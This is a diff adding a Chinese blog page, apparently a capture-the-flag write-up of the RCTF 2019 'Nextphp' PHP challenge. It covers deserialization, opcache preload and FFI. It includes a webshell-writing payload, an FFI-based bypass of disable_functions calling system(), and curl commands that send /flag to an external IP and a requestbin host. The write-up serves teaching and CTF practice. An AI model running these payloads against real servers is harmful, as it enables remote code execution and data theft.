@@ -1,0 +1,757 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    [RCTF 2019]Nextphp |
+    
+    KL
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="题目代码： 123456&lt;?phpif (isset($_GET[&#x27;a&#x27;])) &#123;    eval($_GET[&#x27;a&#x27;]);&#125; else &#123;    show_source(__FILE__);&#125; 用phpinfo()查看了一下 有两处限制： 启用了disable_function,禁了很多函数 使得open_ba">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[RCTF 2019]Nextphp">
+<meta property="og:url" content="http://example.com/2025/05/12/[RCTF%202019]Nextphp/index.html">
+<meta property="og:site_name" content="KL">
+<meta property="og:description" content="题目代码： 123456&lt;?phpif (isset($_GET[&#x27;a&#x27;])) &#123;    eval($_GET[&#x27;a&#x27;]);&#125; else &#123;    show_source(__FILE__);&#125; 用phpinfo()查看了一下 有两处限制： 启用了disable_function,禁了很多函数 使得open_ba">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2025/05/12/images/20250512170540782.png">
+<meta property="og:image" content="http://example.com/2025/05/12/images/20250512170118625.png">
+<meta property="og:image" content="http://example.com/2025/05/12/images/20250512170147700.png">
+<meta property="article:published_time" content="2025-05-12T08:10:33.000Z">
+<meta property="article:modified_time" content="2025-05-12T09:45:10.907Z">
+<meta property="article:author" content="FuB0Y">
+<meta property="article:tag" content="PHP FFI绕过disable_function()">
+<meta property="article:tag" content="rce">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2025/05/12/images/20250512170540782.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+    
+      
+        
+<link rel="stylesheet" href="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.css">
+
+      
+    
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture>
+      
+    </picture>
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="[RCTF 2019]Nextphp">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">[RCTF 2019]Nextphp</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81"><span class="toc-number">1.</span> <span class="toc-text"> 源码：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php-%E5%A4%96%E9%83%A8%E5%87%BD%E6%95%B0%E6%8E%A5%E5%8F%A3ffi%E5%AD%A6%E4%B9%A0"><span class="toc-number">2.</span> <span class="toc-text"> PHP 外部函数接口FFI学习</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E6%8E%A5%E5%8F%A3"><span class="toc-number">3.</span> <span class="toc-text"> 序列化接口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%84%E5%8A%A0%E8%BD%BD"><span class="toc-number">4.</span> <span class="toc-text"> 预加载</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-number">5.</span> <span class="toc-text"> 解题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93"><span class="toc-number">6.</span> <span class="toc-text"> 知识点总结</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">186</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">4</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">179</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-[RCTF 2019]Nextphp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2025/05/12/%5BRCTF%202019%5DNextphp/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-05-12T08:10:33.000Z" itemprop="datePublished">2025-05-12</time>
+    <time style="display: none;" id="post-update-time">2025-05-12</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%88%B7%E9%A2%98/" data-aos="zoom-in">刷题</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <p>题目代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&#x27;a&#x27;])) &#123;</span><br><span class="line">    eval($_GET[&#x27;a&#x27;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>用phpinfo()查看了一下</p>
+<p><strong>有两处限制：</strong></p>
+<p>启用了disable_function,禁了很多函数</p>
+<p>使得open_basedir=“/var/www/html”，只能查看当前目录</p>
+<p>这里有两种办法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1：直接写马</span><br><span class="line">?a=file_put_contents(&quot;shell.php&quot;,&quot;&lt;?php #eval($_POST[cmd]);?&gt;&quot;)</span><br><span class="line">蚁剑连接</span><br><span class="line"></span><br><span class="line">2:：无参rce</span><br><span class="line">?a=highlight_file(end(scandir(current(localeconv()))));</span><br></pre></td></tr></table></figure>
+<p>两种方法的结果都是得到一个preload.php文件</p>
+<h2 id="源码"><a class="markdownIt-Anchor" href="#源码"></a> 源码：</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 定义一个 final 类 A，实现 Serializable 接口（可序列化）</span><br><span class="line">final class A implements Serializable &#123;</span><br><span class="line">    // 受保护的属性 $data，存储数据和函数调用信息</span><br><span class="line">    protected $data = [</span><br><span class="line">        &#x27;ret&#x27; =&gt; null,    // 存储函数执行结果</span><br><span class="line">        &#x27;func&#x27; =&gt; &#x27;print_r&#x27;,  // 默认调用的函数名</span><br><span class="line">        &#x27;arg&#x27; =&gt; &#x27;1&#x27;      // 函数参数</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    // 私有方法 run，执行 data 中指定的函数</span><br><span class="line">    private function run () &#123;</span><br><span class="line">        // 调用 $data[&#x27;func&#x27;] 指定的函数，参数为 $data[&#x27;arg&#x27;]，结果存入 $data[&#x27;ret&#x27;]</span><br><span class="line">        $this-&gt;data[&#x27;ret&#x27;] = $this-&gt;data[&#x27;func&#x27;]($this-&gt;data[&#x27;arg&#x27;]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 魔术方法 __serialize，定义对象如何被序列化（PHP 7.4+）</span><br><span class="line">    public function __serialize(): array &#123;</span><br><span class="line">        return $this-&gt;data;  // 直接返回 data 数组用于序列化</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 魔术方法 __unserialize，定义对象如何反序列化（PHP 7.4+）</span><br><span class="line">    public function __unserialize(array $data) &#123;</span><br><span class="line">        // 合并传入的 data 和当前对象的 data</span><br><span class="line">        array_merge($this-&gt;data, $data);</span><br><span class="line">        $this-&gt;run();  // 执行 run 方法</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 实现 Serializable 接口的 serialize 方法（PHP 老版本序列化方式）</span><br><span class="line">    public function serialize (): string &#123;</span><br><span class="line">        return serialize($this-&gt;data);  // 序列化 data 数组</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 实现 Serializable 接口的 unserialize 方法</span><br><span class="line">    public function unserialize($payload) &#123;</span><br><span class="line">        $this-&gt;data = unserialize($payload);  // 反序列化数据到 data</span><br><span class="line">        $this-&gt;run();  // 执行 run 方法</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 魔术方法 __get，当访问不可访问属性时调用</span><br><span class="line">    public function __get ($key) &#123;</span><br><span class="line">        return $this-&gt;data[$key];  // 返回 data 中对应的值</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 魔术方法 __set，当设置不可访问属性时调用</span><br><span class="line">    public function __set ($key, $value) &#123;</span><br><span class="line">        throw new \Exception(&#x27;No implemented&#x27;);  // 直接抛出异常</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 构造方法</span><br><span class="line">    public function __construct () &#123;</span><br><span class="line">        throw new \Exception(&#x27;No implemented&#x27;);  // 禁止直接实例化</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="php-外部函数接口ffi学习"><a class="markdownIt-Anchor" href="#php-外部函数接口ffi学习"></a> PHP 外部函数接口FFI学习</h2>
+<p><strong>FFI是什么？</strong></p>
+<p>FFI是php7.4出的一个扩展，提供了高级语言直接的相互调用，相对于PHP来说，FFI可以让我们方便的调用C语言写的各种库</p>
+<p>使用FFI条件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- 使用FFI需要启用PHP7.4配置中的ext/ffi，在 php.ini 中去掉 extension=ffi 前面的 ;</span><br><span class="line">- PHP-FFI要求libffi-3以上</span><br><span class="line">- ffi.enable=true</span><br></pre></td></tr></table></figure>
+<p><strong>它允许开发者在 PHP 中调用 C 函数和使用 C 数据类型</strong></p>
+<p>我们可以通过 FFI 调用很多危险的函数，比如 system，比如 php_exec：</p>
+<p><img src="../images/20250512170540782.png" alt="image-20250512170540782" /></p>
+<p>更有趣的一点是，FFI 可以绕过 php.ini 中 open_basedir 和 disable_functions 的限制。</p>
+<p>当然，这么强大的功能自然也是有一些限制的：</p>
+<p>在默认配置下，我们只能在<strong>预加载的 PHP 文件中</strong>使用 FFI，同时要注意的一点是，我们可以通过在预加载的 PHP 文件中生成一些 FFI\CData 对象，再交给我们的一般代码中使用的方式，来实现一般代码对 FFI 的使用，这也是 RCTF 的 Web 签到题的主要考点。</p>
+<p>如果我们第二个参数，也就是 lib 的文件名空着，他还能加载到 libc 中的 system函数吗？</p>
+<p>官方手册上这么说：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">If lib is omitted, platforms supporting RTLD_DEFAULT attempt to lookup symbols declared in code in the normal global scope. Other systems will fail to resolve these symbols.</span><br></pre></td></tr></table></figure>
+<p>也就是说一般情况下，会尝试在全局范围内对符号进行寻找。</p>
+<h2 id="序列化接口"><a class="markdownIt-Anchor" href="#序列化接口"></a> 序列化接口</h2>
+<p>序列化接口（ Serializable ）在 PHP7.4 之前的版本就已经存在了</p>
+<p>简单来说就是接口中定义了两个方法 serialize 和 unserialize，这两个方法代替了 PHP 魔术方法中的 __sleep 和 __wakeup。</p>
+<p>原本的魔术方法主要用于选择要进行序列化的成员变量以及在反序列化时执行各种初始化操作：</p>
+<p><img src="../images/20250512170118625.png" alt="image-20250512170118625" /></p>
+<p>而序列化接口则给了用户更多的自由，通过序列化接口用户可以自己定义自己的序列化操作：</p>
+<p><img src="../images/20250512170147700.png" alt="image-20250512170147700" /></p>
+<p>而PHP7.4 提出了两个新的序列化接口：<code>__serialize()</code>/ <code>__unserialize()</code>：</p>
+<p>在同时拥有两种序列化接口的时候，PHP7.4 会优先<strong>使用新版本的接口</strong>。</p>
+<h2 id="预加载"><a class="markdownIt-Anchor" href="#预加载"></a> 预加载</h2>
+<p>在 PHP7.4 中，php.ini 有一个新指令 opcache.preload，这个指令可以用来预加载一个 PHP 文件，被预加载的 PHP 文件将被执行，并永远缓存在 opcache 内存中。通过在该 PHP 文件中包含，或者使用 opcache_compile_file 函数的方式，我们可以将其他 PHP 文件或者整个框架都预加载到 opcache 内存中。</p>
+<p>预加载的类和函数始终可用，并且使用函数 function_exists 或 class_exists 检查的时候，返回值为 TRUE。</p>
+<h2 id="解题"><a class="markdownIt-Anchor" href="#解题"></a> 解题</h2>
+<p>我们再信息搜集一下就会发现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">opcache.preload = /var/www/html/preload.php</span><br><span class="line">FFI support = enabled</span><br></pre></td></tr></table></figure>
+<p>exp:</p>
+<p>在 FFI::cdef 不传第二个参数时，可以直接调用 PHP 源码中的函数，于是我们可以考虑直接调用 PHP 里执行命令的函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">final class A implements Serializable &#123;</span><br><span class="line">    protected $data = [</span><br><span class="line">        &#x27;ret&#x27; =&gt; null,</span><br><span class="line">        &#x27;func&#x27; =&gt; &#x27;FFI::cdef&#x27;,                          </span><br><span class="line">        &#x27;arg&#x27; =&gt; &#x27;int system(const char *command);&#x27;     //声明</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    public function serialize (): string &#123;</span><br><span class="line">        return serialize($this-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function unserialize($payload) &#123;</span><br><span class="line">        $this-&gt;data = unserialize($payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new A();</span><br><span class="line">$b = serialize($a);</span><br><span class="line">echo $b;</span><br><span class="line"></span><br><span class="line">//C:1:&quot;A&quot;:95:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:32:&quot;int system(const char *command);&quot;;&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>上述代码实现声明<br />
+<code>FFI::cdef(&quot;int system(const char *command);&quot;)</code></p>
+<p>所以现在只需调用即可，通过设置__serialize()[‘ret’]的值获取flag</p>
+<p><code>__serialize()['ret']-&gt;system('curl -d @/flag linux靶机的ip')</code></p>
+<p>完整payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=$a=unserialize(&#x27;C:1:&quot;A&quot;:95:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:32:&quot;int system(const char *command);&quot;;&#125;&#125;&#x27;)-&gt;__serialize()[&#x27;ret&#x27;]-&gt;system(&#x27;curl -d @/flag linux靶机ip:8888&#x27;);</span><br></pre></td></tr></table></figure>
+<p>或者：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=$a=unserialize(base64_decode(&quot;QzoxOiJBIjo5Nzp7YTozOntzOjM6InJldCI7TjtzOjQ6ImZ1bmMiO3M6OToiRkZJOjpjZGVmIjtzOjM6ImFyZyI7czozNDoiaW50IHBocF9leGVjKGludCB0eXBlLCBjaGFyICpjbWQpOyI7fX0=&quot;));var_dump($a-&gt;ret-&gt;php_exec(2,%27curl%20http://http.requestbin.buuoj.cn/1f4vjz01?a=`cat%20/flag`%27));</span><br></pre></td></tr></table></figure>
+<p>或者：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?a=$a=unserialize(&#x27;C:1:&quot;A&quot;:95:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:32:&quot;int system(const char *command);&quot;;&#125;&#125;&#x27;)-&gt;__serialize()[&#x27;ret&#x27;]-&gt;system(&#x27;cat /flag|tee 1.txt&#x27;);</span><br><span class="line">直接访问1.txt得到flag</span><br></pre></td></tr></table></figure>
+<p>完整解析payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">传入$a之后，进行unserialize反序列化，然后因为php7.4的更新，会找__unserialize()函数，然后执行run()函数，然后data[&#x27;ret&#x27;]=FFI::cdef(&#x27;int system(char *command);&#x27;)，然后使用从C库中加载的system函数</span><br></pre></td></tr></table></figure>
+<h2 id="知识点总结"><a class="markdownIt-Anchor" href="#知识点总结"></a> 知识点总结</h2>
+<ol>
+<li>无参数rce</li>
+<li>phpFFI利用绕过disable_functions 限制版本(PHP 7 &gt;= 7.4.0, PHP 8)(本题是7.4)</li>
+<li>如果一个类同时实现了Serializable和<code>__Serialize（）</code>/<code>__Unserialize（）</code>，则序列化将倾向于使用新机制，而非序列化则可以使用其中一种机制，具体取决于使用的是C（Serializable）还是O（Uu unserialize）格式。因此，以C格式编码的旧的序列化字符串仍然可以解码，而新的字符串将以O格式生成。</li>
+<li>FFI API只能在CLI脚本和预加载的PHP文件中使用。默认ffi.enable=preload ** 且仅在命令行模式和 **preload 文件中可用</li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/PHP-FFI%E7%BB%95%E8%BF%87disable-function/" rel="tag">PHP FFI绕过disable_function()</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/rce/" rel="tag">rce</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="/images/17369576223624.jpg" data-sizes="auto" alt="Wallbreaker_Easy" class="lazyload">
+          
+        
+        <a href="/2025/05/15/Wallbreaker_Easy/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            Wallbreaker_Easy
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/images/124691006_p0_master1200.jpg" data-sizes="auto" alt="[watevrCTF-2019]Supercalc" class="lazyload">
+        
+      
+      <a href="/2025/05/12/%5BwatevrCTF%202019%5DSupercalc/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          [watevrCTF-2019]Supercalc
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2025
+      <span class="footer-info-sep rotate"></span>
+      FuB0Y
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        284k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        20:48
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
